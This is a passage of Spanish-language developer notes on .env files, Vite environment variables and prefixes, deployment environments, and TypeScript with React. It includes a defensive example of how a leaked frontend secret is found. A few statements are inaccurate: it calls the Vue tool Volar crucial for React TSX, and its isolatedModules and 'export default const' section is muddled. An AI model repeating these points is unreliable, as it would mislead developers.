Credenciales de Bases de Datos: DB_PASSWORD, DB_USER.

Claves Secretas de API: STRIPE_SECRET_KEY, JWT_SECRET.

Tokens de Autenticación: AUTH0_CLIENT_SECRET.


#### Implementación de vars env

Aunque las variables existen a nivel del sistema operativo, en el desarrollo de aplicaciones se gestionan comúnmente de las siguientes maneras:

    
1. Archivos .env

Para el desarrollo local, es estándar almacenar las variables en archivos llamados .env (o .env.development, .env.production).

Estos archivos se cargan al inicio de la aplicación mediante librerías como dotenv (en Node.js).

El archivo .env o .env.local debe estar siempre en el .gitignore para proteger los secretos.


2. Entornos de Hosting (CI/CD)

En producción, nunca se sube el archivo .env

En su lugar, las variables se configuran directamente en la plataforma de despliegue

(ej., Vercel, Netlify, AWS, Docker).

Plataformas Cloud: Ofrecen una interfaz para ingresar las claves y valores, inyectándolos de forma segura en el proceso de la aplicación en tiempo de ejecución.


3. Acceso en Código

En la mayoría de los lenguajes, las variables se acceden a través de un objeto global.

Node.js/JavaScript: `process.env.NOMBRE_VARIABLE`
    
Python: `os.environ['NOMBRE_VARIABLE']`


#### Requerimiento del Bundler

El archivo .env es una configuración para la herramienta de build, no para el código de tu aplicación directamente

El bundler necesita acceder a ellos al inicio del proceso para poder inyectar las variables donde sean necesarias.

El proceso de build (ejecutado por Vite) es el que lee el archivo .env en la raíz

filtra las variables (solo las que tienen el prefijo VITE_ en el caso de Vite)

y las pone a disposición del código a través de import.meta.env.


Convención Estándar:

Casi todas las herramientas de desarrollo y los runtimes de Node.js (incluidos los que usan librerías como dotenv) buscan automáticamente los archivos .env en el directorio de trabajo raíz donde se ejecuta el comando npm run dev o npm run build.


Seguridad y .gitignore

Al mantenerlos en la raíz, se facilita la gestión de seguridad con Git:

El archivo .gitignore también está en la raíz, por lo que puedes agregar líneas como:

```
# Archivos sensibles que nunca deben ser subidos
.env
.env.local
```

Ubicación:

.env:
Raíz del Proyecto
Variables de entorno del proyecto (leídas por Vite/Bundler).

src/:
Carpeta Principal
Código fuente de la aplicación (archivos .js, .tsx, .css).

public/:
Carpeta Principal	
Archivos estáticos que no necesitan ser procesados (imágenes, favicons).


#### Archivos fuera de src

Colocar los archivos de configuración en la raíz es mantener una separación estricta entre:

1. Configuración del Entorno: Todo lo relacionado con el build, despliegue, variables secretas y scripts
(ej., package.json, vite.config.js, .gitignore, y los .env). 
Esto va en la raíz.

2. Manejo por el Bundler (Vite/Webpack):
Vite y otras herramientas de build están configuradas por defecto para buscar los archivos de configuración del proyecto en el directorio raíz.
El bundler lee los archivos .env antes de comenzar la transpilación y la inyección de las variables.
##### Si el archivo estuviera dentro de src/, el bundler podría no encontrarlo o intentar procesarlo como parte del código fuente, lo cual es incorrecto



### Vars env en Vite

Forma esencial de inyectar configuraciones dinámicas en tu frontend

Permitiendo que la aplicación se comporte de manera diferente según el entorno en el que se esté ejecutando (desarrollo local, staging o producción).


1. Acceso y Prefijo (VITE_)

##### Vite carga las variables de entorno desde los archivos .env

##### Las expone al código de tu aplicación a través de un objeto especial: import.meta.env.


Regla del Prefijo:

##### Para proteger las variables sensibles (que a veces se usan solo a nivel de build o servidor)

y evitar exponerlas innecesariamente al frontend, Vite aplica un estricto filtro:

1. Solo las variables que comienzan con VITE_ se exponen al código del lado del cliente (import.meta.env).

2. Las variables sin este prefijo (ej., SECRET_KEY) permanecen privadas durante el proceso de build y nunca llegan al navegador

Ej: Acceder a una variable llamada VITE_API_URL en tu código React

```
// Vite:
const apiUrl = import.meta.env.VITE_API_URL;

// En React:
fetch(`${import.meta.env.VITE_API_URL}/usuarios`);
```


2. Archivos .env Específicos por Modo

Vite usa el concepto de Modos de forma nativa

Un modo es simplemente una cadena que define el entorno actual (similar a NODE_ENV).

Por defecto, Vite tiene dos modos: development y production.


Puedes crear archivos .env específicos para cada modo

Vite los carga en el siguiente orden, sobrescribiendo los valores anteriores si hay conflictos:

Archivo	| Modo de Carga |	Uso

`.env`	Siempre	Variables por defecto que se aplican a todos los modos.
`.env.local`	Siempre	Sobrescribe los valores de .env. Debe estar en .gitignore para variables locales o sensibles.
`.env.[mode]`	Solo en el modo especificado	Configuración específica para ese modo (ej., .env.staging).
`.env.[mode].local`	Solo en el modo especificado	Configuración local específica que sobrescribe a .env.[mode].


Ejecutar un Modo Específico

##### Puedes indicarle a Vite qué modo usar en el script de tu package.json:

```
"scripts": {
  "dev": "vite", // -> Carga .env y .env.development
  "build": "vite build", // -> Carga .env y .env.production
  "preview:staging": "vite preview --mode staging" // -> Carga .env y .env.staging
}
```


3. Variables de Entorno Integradas

Vite automáticamente expone algunas variables de entorno útiles que no necesitan el prefijo VITE_ ni estar en un archivo .env

1. import.meta.env.MODE
El modo actual en el que se está ejecutando la aplicación 
(ej. development, production, staging).
uso: development

2. import.meta.env.BASE_URL
La URL base pública donde se sirve la aplicación.
(Útil para manejar activos estáticos).
uso: /

3. import.meta.env.DEV
Booleano que es true si el modo actual es development.
uso: true

4. import.meta.env.PROD
Booleano que es true si el modo actual es production.
uso: false

Estas variables integradas te permiten aplicar lógica condicional en tu código:

```
if (import.meta.env.DEV) {
  console.log('Ejecutando en modo de desarrollo...');
}
```


#### Variables en .env

##### Todas aquellas configuraciones que son sensibles o que cambian según el entorno de despliegue (desarrollo, staging, producción).

##### Objetivo: nunca subir información sensible o específica del entorno al repositorio de Git.

categorías clave y ejemplos de variables a incluir en .env


1. Claves Secretas y Tokens (Confidencialidad)

Estas variables deben ser tratadas con la máxima cautela y nunca deben ser subidas a Git

Por lo general, solo se necesitan en el backend, pero si tu frontend necesita una clave pública de un servicio, debe ir aquí.


Variable | Uso / Tipo | Nota de Seguridad

SECRET_KEY
Clave criptográfica para firmar cookies, sesiones, o tokens JWT (Backend).
¡CRÍTICO! Nunca la expongas al frontend.

DB_PASSWORD:
Contraseña de la base de datos (Backend).
¡CRÍTICO! Nunca la expongas.

FIREBASE_PRIVATE_KEY:
Claves privadas de servicios en la nube (Backend/Admin).
¡CRÍTICO! Nunca la expongas.

STRIPE_PUBLIC_KEY:
Clave pública de servicios de pago (Frontend).
Se puede exponer, pero debe configurarse en .env.


2. Configuraciones de Entorno (Cambio Constante)

##### Variables que cambian obligatoriamente entre tu máquina local y el servidor de producción.

Variable | Propósito | Ejemplo de Desarrollo (.env.development)

API_BASE_URL:
URL base de tu backend o API principal.
http://localhost:8080/v1

CLOUDINARY_URL:
URL o endpoint de tu servicio de almacenamiento de imágenes.
https://api.cloudinary.com/v1_1/dev-bucket

EMAIL_HOST:
Host, puerto y credenciales del servicio de envío de correos (Backend).
smtp.mailtrap.io

NODE_ENV:
Define el modo de la aplicación
(solo si no lo configura la herramienta de build).
development


3. Servicios de Terceros (API Keys Públicas)

Cualquier clave pública necesaria para servicios externos debe ir en el archivo .env para facilitar el cambio entre claves de prueba y claves de producción.

Variable	Propósito	Tecnología

MAPBOX_API_KEY:
Clave pública para mapas y geolocalización.
Mapbox, Google Maps, etc.

ANALYTICS_TRACKING_ID:
ID de seguimiento para herramientas de analítica.
Google Analytics, Plausible, etc.

SENTRY_DSN_
Clave para el seguimiento de errores en tiempo real.
Sentry, DataDog, etc.


##### Uso de var .env:

Debes incluir una variable en .env si cumple con al menos una de estas condiciones:

1. Es un secreto: Contraseñas, claves de bases de datos, tokens privados.

2. Cambia por entorno: La URL de la API es diferente en desarrollo (localhost) que en producción.

3. Es una configuración de flag: Usada para habilitar/deshabilitar una característica rápidamente sin modificar el código (ej., FEATURE_BETA_ENABLED=true).

El archivo .env (o su versión local, .env.local) debe estar siempre incluido en el .gitignore para evitar que esta información sensible o variable se publique en tu repositorio de Git.


### Exposición de variables sensibles

Significa que se ha incluido información crítica (como claves privadas, contraseñas, tokens o URLs de bases de datos)

En el código JavaScript compilado que se descarga y ejecuta en el navegador del usuario

Es una vulnerabilidad de seguridad grave

Cualquier usuario puede ver el código fuente (a través de las herramientas de desarrollador) y acceder a esa información.


##### Las herramientas de build modernas inyectan las variables de entorno (.env) directamente en el código JavaScript durante la compilación.

##### Si tú expones una variable que solo debería ser conocida por el servidor, esta se vuelve pública.

Una variable se vuelve sensible si permite a un atacante tomar control, suplantar identidad o acceder a datos privados.


1. Claves Secretas del Servidor (Peor caso)

El error más peligroso. 

Las claves privadas (o secrets) se usan para firmar datos, autenticar servidores o acceder a servicios con privilegios elevados 


Variable Sensible |	Riesgo

VITE_API_PRIVATE_KEY:
Si se usa para firmar tokens JWT, un atacante puede generar tokens válidos
y suplantar a cualquier usuario o administrador.

VITE_DB_PASSWORD:
Permite al atacante intentar una conexión directa a tu base de datos
si las reglas de seguridad son débiles.
 
VITE_CLOUDINARY_SECRET:
Permite al atacante subir, eliminar o manipular todos los archivos de tu servicio de almacenamiento en la nube.
 
 
2. Claves de Servicios con Control de Gasto

Aunque sean "claves públicas", algunas claves se facturan por uso.

Exponerlas permite el abuso.

VITE_MAPS_BILLING_KEY:
Un atacante puede tomar la clave y usarla en su propia aplicación
agotando tu cuota y generando altos costos de facturación.


Ejemplo:
clave privada de API que el servidor necesita para autenticar una solicitud
y la incluyes en tu archivo .env del frontend

Archivo .env: 

```
# Esta clave es solo para el servidor
VITE_SERVER_SECRET=mi-clave-super-secreta-12345
VITE_API_URL=https://api.miaplicacion.com
```

Frontend:

```
// La clave sensible se inyecta aquí.
const secret = import.meta.env.VITE_SERVER_SECRET;

// Si la usas para enviar una solicitud, no importa: ¡ya está visible!
fetch(import.meta.env.VITE_API_URL, {
  method: 'POST',
  headers: {
    'X-Auth-Secret': secret // ¡La clave se envía y queda expuesta en la red!
  }
});
```

1. El atacante navega a tu sitio.

2. Abre las herramientas de desarrollador (F12) y va a la pestaña "Source" (Fuentes).

3. Busca en el bundle de JavaScript (ej., main.js) o en la pestaña "Network" (Red) y encuentra la cadena mi-clave-super-secreta-12345.

4. Una vez obtenida la clave, puede usarla para interactuar con tu API y actuar maliciosamente.


Solución:

##### La clave nunca debe enviarse directamente desde el frontend

##### El frontend debe enviar una credencial pública (como un nombre de usuario/contraseña o un refresh token).

##### El servidor es el único lugar donde debe residir la lógica que requiere la clave sensible:

1. Frontend: Envía credenciales de usuario.

2. Backend: Recibe las credenciales, usa la clave privada (almacenada solo en el servidor) para firmar un token JWT, y lo envía de vuelta al frontend.

3. Frontend: Solo almacena y usa el token JWT (que es público y expira).



### Entorno de Desarrollo 

##### Esencial para la eficiencia del equipo, la calidad del código y la estabilidad del proyecto

1. Desarrollo Base

Entorno Consistente:
NVM (Node Version Manager)
Permite a todos los desarrolladores usar exactamente la misma versión de Node.js,

Construcción Rápida:
Vite / Webpack (Configurado)
Asegúrate de que el servidor de desarrollo (dev server) y el Hot Module Replacement (HMR) sean instantáneos.

Gestión de Paquetes:
pnpm o Yarn
Usa un gestor de paquetes moderno para instalaciones rápidas y para optimizar el espacio en disco (pnpm)
o para el manejo robusto de workspaces (Yarn/pnpm).


2. Calidad de Código y Automatización

Tipado Estricto (TypeScript):
Configura el tsconfig.json con strict: true
Esto atrapa la inmensa mayoría de errores de lógica antes de que el código se ejecute.

Tipado de API: Define tipos e interfaces para los datos que recibes de la API
Usa librerías como Zod para validar en runtime que los datos recibidos cumplen con tus modelos esperados.


Linters y Formateadores:

ESLint: Configúralo con plugins específicos de la librería que uses (ej., eslint-plugin-react-hooks) para forzar las reglas de los hooks y las buenas prácticas de React.
Prettier: Úsalo para el formateo automático del código. Es una regla de estilo que no debe ser debatida ni revisada en code review. Configura tu IDE para que se ejecute al guardar el archivo

##### Hooks de Pre-Commit (Husky): Configura Husky para que ejecute automáticamente Prettier y ESLint antes de cada git commit
Esto evita que el código con errores de estilo o fallos básicos entre al repositorio.


Importaciones Absolutas:

Alias de Rutas: Configura alias de rutas (@/ o ~/) en la configuración de tu bundler (vite.config.js) y en tsconfig.json
Esto simplifica las importaciones, evita rutas relativas largas (../../../) y facilita las refactorizaciones.


3. Gestión del Estado y Datos

Inmutabilidad:

Prioriza useMemo y useCallback: Usa estos hooks para estabilizar las referencias de objetos, arreglos y funciones que se pasan a componentes hijos memorizados
Esto es clave para que las optimizaciones de React funcionen.

Copias Inmutables: Nunca modifiques el estado directamente.
Utiliza el operador Spread (...) o funciones inmutables (map, filter, slice) para crear copias del estado antes de aplicar cambios.


Gestión de Datos Remotos:

Herramientas de Caching: Usa librerías dedicadas al data fetching (ej., TanStack Query).
Estas manejan automáticamente el estado de carga, el caching, la invalidación y los reintentos, simplificando enormemente la lógica de tus componentes.


4. Entornos y Configuración Local

Variables de Entorno Seguras:

##### Prefijos de Exposición: En Vite, usa el prefijo VITE_ solo para las variables que deben ser accesibles en el navegador (ej., VITE_API_URL).
##### Asegúrate de que ninguna clave privada o secreta lleve este prefijo.

Archivos por Entorno: Usa .env.development, .env.staging, y .env.production para gestionar las URLs de la API y las flags de funciones por separado.


Aislamiento del Entorno:

Exclusión de Git: 
##### Asegúrate de que tu archivo .gitignore incluya siempre la carpeta de dependencias (/node_modules) y la carpeta de build (/dist o /build), y cualquier archivo sensible o local (.env.local).


Scripts Estándar:

Scripts de package.json: Define scripts estándar y claros para el desarrollo y la calidad:

"dev": Inicia el servidor de desarrollo.

"build": Genera la versión de producción.

"test": Ejecuta las pruebas unitarias.

"lint": Ejecuta ESLint.

"preview": Sirve la versión compilada localmente


5. Pruebas

Testing Library (UX): React Testing Library para escribir pruebas que se centren en el comportamiento del usuario y la accesibilida
en lugar de probar detalles de implementación internos de los componentes.

Unidad con Vitest: Utiliza Vitest (si usas Vite) para pruebas unitarias de Custom Hooks y utilidades.
Es rápido y se integra perfectamente con el entorno de Vite.

Pruebas de Integración: Incluye pruebas que verifiquen el flujo de trabajo entre varios componentes y la simulación de llamadas a la API
(usando librerías como msw para mockear las API).



### Entorno de Staging (o pre-producción)

##### Este entorno debe ser un espejo lo más exacto posible de la producción, pero usado para pruebas finales.


Separación de entornos:

1. Variables de Entorno Propias

El entorno de staging debe tener su propio conjunto de variables de entorno, diferentes a las de desarrollo y producción

Archivos .env: Crea un archivo específico, por ejemplo, .env.staging.

APIs de Staging: La variable de la URL de la API debe apuntar al backend de staging.
VITE_API_URL en staging apunta a https://api.staging.miaplicacion.com.

Claves de Servicios: Usa cuentas de prueba o sandboxes de terceros (ej., la cuenta de Stripe/PayPal de prueba) para evitar transacciones reales.


2. Modo de Producción

Compilación Optimizada: El build de staging siempre debe ejecutarse en modo production. Esto asegura que

NODE_ENV sea production.

Vite ejecute optimizaciones de rendimiento, minificación y tree-shaking.

Se utilicen las versiones de librería optimizadas para producción (sin warnings de desarrollo).


Mirroring de Infraestructura:

##### El objetivo es que staging imite el entorno real tanto como sea posible para capturar problemas de despliegue y rendimiento.


1. Servidor y Hosting Idénticos

Mismo Proveedor: Despliega el frontend de staging en el mismo proveedor de hosting (ej., Vercel, Netlify, AWS S3/CloudFront) que usas para producción.

Misma CDN: Si utilizas una CDN (Content Delivery Network), el staging debe usar una configuración de CDN similar para probar el caching y el rendimiento geográfico.


2. Dominio Real

Dominio Propio: El staging debe tener su propio subdominio claro, como staging.miaplicacion.com.

Esto valida la configuración de certificados SSL, headers HTTP y cookies que pueden variar entre dominios.


Pruebas de Calidad y Observabilidad:

1. Ejecución de Tests Automatizados

Pre-despliegue: La pipeline de CI/CD debe ejecutar todos los tests unitarios y de integración antes de desplegar a staging

Pruebas End-to-End (E2E): Es el lugar ideal para ejecutar las pruebas E2E (usando herramientas como Cypress o Playwright),
ya que prueban la aplicación completa en un entorno "casi real" que incluye el backend de staging.


2. Monitoreo y Logging

Seguimiento de Errores: Configura las mismas herramientas de monitoreo de errores de runtime (como Sentry o New Relic) en staging
Esto asegura que el monitoreo funcionará en producción y captura cualquier error que ocurra durante las pruebas manuales.

Logging: Los logs de staging deben estar separados de los de producción (usando un prefijo o tag), pero deben tener el mismo nivel de detalle para debugging si falla el build o una prueba


Colaboración y Workflow

1. Pipeline de CI/CD

Despliegue Continuo (CD): Configura la automatización (GitHub Actions, GitLab CI, etc.) para que cada merge a una rama de revisión
(ej., release/v2.0 o develop) active automáticamente el despliegue a staging.

Puerta de Producción: El entorno de staging debe actuar como el último "gate" antes de que el código llegue a la rama main y, por lo tanto, a producción. 
Una vez que staging está aprobado, el equipo puede confiar en el merge o deploy final.


2. Acceso Controlado

Autenticación de Staging: Si la aplicación está disponible públicamente, considera proteger el entorno de staging con una autenticación simple
(ej., password global o autenticación HTTP básica) para que solo los probadores, stakeholders y clientes específicos puedan acceder.

Pruebas de Carga (Load Testing)
Simulación: Si tu aplicación tiene requerimientos de alto tráfico, staging es el lugar para realizar pruebas de carga ligeras para asegurar que el frontend y la conexión con el backend de staging se comportan bien bajo estrés.



### Entorno de Producción

##### Este entorno debe priorizar la seguridad, la velocidad de carga y la estabilidad por encima de todo.

1. Seguridad y Exposición de Variables

Cero Variables Sensibles:

Aislamiento Total: Asegúrate de que ninguna variable secreta (contraseñas, tokens privados, claves de bases de datos) esté en el archivo .env.production ni en el código compilado
Estas deben residir únicamente en el servidor de backend o en el sistema de build (CI/CD) si son necesarias para la compilación.

Solo Claves Públicas: Las únicas claves que debe exponer tu frontend son las claves públicas de servicios de terceros:
(Stripe public key, Google Analytics ID).


Uso Exclusivo de HTTPS:

Certificados SSL/TLS: Asegúrate de que el sitio de producción se sirva siempre bajo HTTPS
Esto garantiza que toda la comunicación entre el navegador del usuario y el servidor esté encriptada, protegiendo datos como tokens de sesión.

HSTS (HTTP Strict Transport Security):
Configura los headers de respuesta del servidor o CDN para forzar que el navegador solo se conecte a través de HTTPS, incluso si el usuario intenta acceder por HTTP


2. Rendimiento y Velocidad de Carga

Optimización del Build:

Minificación y Compresión: Asegúrate de que tu bundler (Vite, Webpack) esté minificando (reduciendo el tamaño de archivos JS/CSS)
y aplicando tree-shaking (eliminando código muerto) al máximo.

Compresión Avanzada: Configura el servidor o la CDN para servir los archivos con compresión moderna
(como Brotli o Gzip de alto nivel) en lugar de raw JS/CSS.


Almacenamiento en Caché (Caching):

Cache-Busting: Asegúrate de que tu build utilice nombres de archivos con hashes (main.a1b2c3d4.js).
Esto permite que los usuarios almacenen estos archivos estáticos en cache por un tiempo muy largo (ej., un año)
mientras que el archivo index.html (que cambia con cada despliegue) se cachea por un tiempo muy corto.

Control de Headers: Configura los headers Cache-Control en el servidor de activos (CDN) de la siguiente manera
Archivos Estáticos (JS/CSS/Imágenes): Cache-Control: max-age=31536000, immutable.
Archivo index.html (o Root): Cache-Control: no-cache, must-revalidate.


Despliegue Global (CDN):

Red de Distribución de Contenido (CDN): Despliega siempre tus activos estáticos (JS, CSS, imágenes) a través de una CDN
(ej., Cloudflare, CloudFront, Vercel Edge Network)

Una CDN almacena copias de tu sitio en servidores ubicados geográficamente más cerca de tus usuarios
reduciendo drásticamente la latencia.


3. Estabilidad y Monitoreo

Logs y Monitoreo de Errores:

APM (Application Performance Monitoring): Utiliza servicios como Sentry
DataDog o New Relic para el monitoreo de errores en tiempo real en producción.
Esto te alertará inmediatamente si ocurre un error de JavaScript en el navegador de un usuario.

Separación de Logs:
Los logs de errores de producción deben estar separados y priorizados de los de staging o desarrollo
Solo los errores de producción deben generar alertas de alta prioridad.


Pruebas Post-Despliegue:
Smoke Tests: Configura un conjunto de pruebas mínimas y rápidas (los smoke tests) en tu pipeline de CI/CD para que se ejecuten inmediatamente después del despliegue en producción.
Esto verifica que las rutas clave y la conexión a la API están funcionando.


Estrategia de Rollback:

Inmutabilidad del Despliegue: Asegúrate de que tu proceso de despliegue sea inmutable.
Cada nuevo build es una carpeta/artefacto totalmente nuevo

Rollback Rápido: Configura tu sistema de hosting para que si se detecta un error grave post-desdespliegue, puedas hacer un rollback instantáneo a la versión estable anterior sin tener que ejecutar un build nuevo.


4. Configuración Específica de Producción

Entorno de Producción Estricto:

NODE_ENV: Asegúrate de que el build final siempre establezca la variable de entorno NODE_ENV a production
Esto activa el modo de producción en librerías como React, eliminando advertencias de desarrollo
logging innecesario y checks de rendimiento que solo se usan en desarrollo.


Deshabilitar Mapas de Origen (Source Maps):

Control de Source Maps: Los source maps (.map files) son útiles para depurar en producción, pero revelan tu código fuente sin minificar.
Buena Práctica: Si decides incluirlos para Sentry o monitoreo, asegúrate de que estén protegidos y no sean accesibles públicamente o que solo se carguen a través de tu servicio de monitoreo
Como práctica de seguridad, a menudo se deshabilitan por completo o se sirven solo en staging.


Archivos de Rutas:

robots.txt: Asegúrate de que este archivo permita a los crawlers de búsqueda indexar todas las rutas importantes
(a menos que quieras específicamente ocultar una página, como la de administración).

sitemap.xml: Genera y publica un archivo sitemap.xml actualizado con todas las rutas de tu sitio para ayudar a los motores de búsqueda a rastrear tu sitio de manera eficiente.




# TS, tsx y React

Vite tiene soporte nativo de alto rendimiento para TypeScript y TSX, ya que utiliza esbuild para la transpilación, lo que lo hace muy rápido.

1. Comando de Vite

```
npm create vite@latest
```

2. Opciones

Project name: ...
Framework: React
Variant: TypeScript o TypeScript + SWC

SWC es un transpilador alternativo aún más rápido, pero TypeScript estándar es suficie


Generará a estructura del proyecto con los archivos necesarios:

main.jsx se convertirá en main.tsx.

App.jsx se convertirá en App.tsx.

Se creará un archivo tsconfig.json (archivo de configuración de TypeScript).


Estructura y config

Si ya tienes un proyecto en JavaScript y quieres migrar, o simplemente quieres revisar la configuración, estos son los archivos clave:

Archivos de Código:
##### Usa la extensión .ts para archivos que contienen lógica pura, Custom Hooks o utilidades (sin sintaxis JSX).
Ejemplo: useFetch.ts, apiService.ts

##### Usa la extensión .tsx para componentes de React que contienen sintaxis JSX.
Ejemplo: Button.tsx, App.tsx.

tsconfig.json:
Vite genera una plantilla funcional, pero debes entender algunos campos:

target:
"ES2020" (o más reciente)
Define el nivel de sintaxis JavaScript a la que compilará el código. 
Vite suele usar un valor moderno.

jsx:	
"react-jsx"
Indica que TypeScript debe esperar y procesar la sintaxis JSX
delegando la transpilación final a la herramienta de build (Vite/esbuild).

module:	
"ESNext"
Asegura el uso de módulos modernos (import/export).

baseUrl:	"."
Se usa junto con paths para configurar importaciones absolutas
(ej., import '@/components/Button').


#### Configuración del Componente (Componente Funcional):

##### En un archivo .tsx, debes tipar explícitamente las props de tu componente usando interfaces o tipos.

```
// Button.tsx

// 1. Definir la interfaz de las Props
interface ButtonProps {
  text: string;
  onClick: () => void; // Tipar las funciones
  disabled?: boolean; // El '?' indica que la prop es opcional
}

// 2. Tipar el componente funcional con React.FC (o solo las props)
const Button: React.FC<ButtonProps> = ({ text, onClick, disabled = false }) => {
  return (
    <button onClick={onClick} disabled={disabled}>
      {text}
    </button>
  );
};

export default Button;
```

Beneficios:

1. Detección de Errores Temprana: El compilador de TypeScript atrapará errores (como pasar un string donde se espera un number) antes de que el código se ejecute en el navegador.

2. Mejor Refactorización: Puedes renombrar variables, componentes o propiedades con confianza en tu IDE
sabiendo que el sistema de tipos actualizará todas las referencias.

3. Documentación Implícita: La definición de tipos e interfaces sirve como documentación instantánea para ti y tu equipo. 

4. Desarrollo Rápido: Aunque configures TypeScript, Vite sigue siendo extremadamente rápido porque solo utiliza TypeScript para la verificación de tipos, delegando la transpilación (conversión de TSX a JS) al rapidísimo esbuild.


### Prácticas

1. Archivos y Convenciones

.tsx vs. .ts: Utiliza .tsx solo para archivos que contengan sintaxis JSX (componentes).

Usa .ts para Custom Hooks, utilidades, servicios de API y reducers que no devuelvan JSX.


2. tsconfig.json Estricto

Asegúrate de que la propiedad strict esté en true en tu tsconfig.json.

Esto activa las verificaciones más estrictas del compilador, como noImplicitAny y strictNullChecks, capturando errores comunes.


Uso de Alias para Importaciones:

1.  Rutas Absolutas: Configura alias de rutas (ej., @/) en tsconfig.json y vite.config.js.

Configura alias de rutas (ej., @/) en tsconfig.json y vite.config.js.

Esto evita tener que escribir rutas relativas largas como ../../../components/ui/Button y mantiene la coherencia.


#### Tipado de Componentes (Props):

1. Definición de Tipos

Prefiere interface: Para tipar las props de los componentes, generalmente se prefiere usar interface sobre type
Las interfaces son más fáciles de extender (extendable) y fusionar (declaration merging), lo que es útil para librerías o estructuras de herencia complejas.

##### Tipado Explícito de Eventos: Cuando manejes eventos del DOM, tipa el objeto event correctamente para acceder a sus propiedades
(ej., e.target.value).

Ejemplo de onChange de input:

```
React.ChangeEvent<HTMLInputElement>
```


2. Tipado de Componentes Funcionales

Uso de React.FC: Puedes tipar tus componentes como const Componente: React.FC<Props> = ({ prop }) => ....
muchos desarrolladores prefieren tipar solo las props (const Componente = ({ prop }: Props) => ...) porque React.FC agrega implícitamente la propiedad children
lo que puede ocultar errores si no esperabas recibirlos.

```
// Recomendado: Tipar directamente las props
interface ButtonProps {
  label: string;
  onClick: () => void; 
}

const Button = ({ label, onClick }: ButtonProps) => {
  // ...
};
```


#### Tipado de Hooks y Lógica

1. Tipado de useState



## Componente Presentacional con TypeScript

Inferencia vs. Explicitud: TypeScript casi siempre puede inferir el tipo de useState a partir del valor inicial
Sin embargo, sé explícito si el valor inicial es null y esperas un objeto después:

```
// Correcto: Indica que el estado será un User o null
interface User { id: number; name: string; }
const [user, setUser] = useState<User | null>(null);
```


Tipado de useReducer:

Acciones y Estado: useReducer requiere un tipado estricto
Define el tipo del estado y el tipo de las acciones
(generalmente como una unión de tipos literales para el campo type).
sto permite que tu reducer garantice que maneja todos los tipos de acción válidos.


Tipado de Custom Hooks: 

Tipado de Retorno: Siempre tipa el valor de retorno de tus Custom Hooks para que el componente que los consume sepa exactamente qué esperar

```
// useCounter.ts
type CounterHook = [number, () => void, () => void];
const useCounter = (initial: number): CounterHook => {
  // ...
};
```


#### Tipado de Datos Asíncronos (API)

Uso de unknown en Fetching:

Seguridad: Cuando haces data fetching (ej., con fetch o axios), la respuesta inicial debe tiparse como unknown
(o any si no tienes otra opción) porque no puedes confiar en datos externos.

Validación Estricta: Inmediatamente después de recibir la respuesta, valídala contra un schema definido usando librerías como Zod o Yup
Esto garantiza que los datos que consumes realmente coincidan con el tipo que esperas.


Tipos Globales de API:

Archivos de Definición: Centraliza todas tus interfaces y tipos de datos de API (ej., IProduct, IUser) en un solo lugar (ej., /src/types/index.ts). 
Esto facilita la reutilización y el mantenimiento de los modelos de datos.


#### Utilidades y Mantenimiento

Evita el any:

Elude any: El uso de any desactiva todas las comprobaciones de TypeScript para esa variable, anulando el propósito de usarlo
Intenta usar tipos más específicos como unknown o Record<string, unknown> cuando el tipo es incierto, forzándote a hacer verificaciones de tipo antes de usar la variable.


Módulos Externos:

##### Archivos d.ts: Si una librería JavaScript de terceros no tiene tipos incluidos, busca el paquete @types/nombre-de-libreria e instálalo como dependencia de desarrollo
Si no existe, puedes crear tu propio archivo .d.ts para declarar los tipos que faltan.


#### Inmutabilidad y Seguridad de Tipos

Tipado de Objetos Inmutables:

Solo Lectura (readonly): Cuando defines un tipo para un arreglo u objeto que sabes que no debe modificarse, usa el modificador readonly
Esto es vital en el estado de React y las props de componentes puros para garantizar la inmutabilidad y evitar mutaciones accidentales.

```
interface UserProps {
  readonly id: number; // No puede ser reasignado
  readonly tags: readonly string[]; // El array no puede ser modificado
}
```


Evitar Mutaciones con as const:

Literales Inmutables: Usa as const para decirle a TypeScript que un arreglo o un objeto no debe ser ampliado y que sus valores literales nunca cambiarán
Esto convierte las propiedades a readonly y los valores a tipos literales precisos, lo que es excelente para definir uniones de tipos de forma segura
(ej., lista de acciones de Redux).


Uso de Unión de Tipos para Props Discretas:

Props Condicionales: Cuando un componente puede recibir diferentes conjuntos de props (por ejemplo, un componente Button que se comporta diferente si recibe una prop href o una prop onClick)
usa Unión de Tipos Disjuntos (Discriminated Unions) para asegurar que solo se pasen las props relevantes para ese caso.
Ejemplo: Si es un botón de enlace, no puede tener onClick.


#### Utilización Avanzada de Tipos

Tipos de Utilidad (Utility Types):

TypeScript incluye varios tipos de utilidad integrados que te ayudan a manipular tipos existentes de forma inmutable:

Partial<Type>: Hace que todas las propiedades de un Type sean opcionales (con ?).
Útil para funciones de actualización o props que no se requieren inmediatamente.

Omit<Type, Keys>: Crea un nuevo tipo omitiendo ciertas Keys del Type original
Útil para pasar props a un componente y excluir las que no necesita el elemento nativo.

Pick<Type, Keys>: Crea un nuevo tipo seleccionando solo ciertas Keys del Type original
Útil para extraer un subconjunto de propiedades de una API.


Tipado de Props que Pasan al DOM:

Propagación de Props Nativas: Para un componente wrapper (envoltorio) que pasa props a un elemento HTML nativo (como un div o button)
usa los tipos intrínsecos de React:

React.HTMLProps<T> o
React.ComponentPropsWithoutRef<'element'> (siendo 'element' div, button, input, etc.).

Ejemplo: interface ButtonProps extends
React.ComponentPropsWithoutRef<'button'> { ... }.
Esto asegura que puedes pasar props nativas como className o id y que estén correctamente tipadas.


Tipos de Retorno Explícitos:

Funciones Puras: Aunque TypeScript a menudo infiere el tipo de retorno, hazlo explícito en funciones críticas o complejas (especialmente Custom Hooks o reducers
Esto actúa como una garantía de que la función siempre devolverá el tipo esperado.


#### Integración con Herramientas (Workflow)

Uso de la Extensión Volar:
Vite/Vue DevTools: Si bien Vite es compatible con React, la extensión de VS Code Volar (o plugins similares) es crucial para una integración fluida con TSX, ya que mejora el syntax highlighting y la comprobación de tipos dentro de los bloques de código y las plantillas.


Evitar el Modo isolatedModules:

Transpilación Segura: Vite usa esbuild o SWC, que transpiladores rápidos que operan en modo de archivo único (similar a isolatedModules).
Esto significa que nunca debes usar export default const sino export default seguido del nombre de la función o componente
ya que el modo isolatedModules no puede exportar correctamente las constantes por defecto.


### SRP con TypeScript

El SRP dicta que cada módulo, clase o función debe tener una y solo una razón para cambiar

Lo aplicaremos dividiendo responsabilidades entre las tres capas: UI (Presentacional), Lógica (Contenedor/Smart) y Reutilización (Custom Hook).


1. Custom Hook (Responsabilidad: Lógica Reutilizable del Estado)

Se encarga de gestionar la lógica de estado (toggle) y es totalmente agnóstico a la UI o a dónde se usará.

Archivo: useFavoriteToggle.ts

```
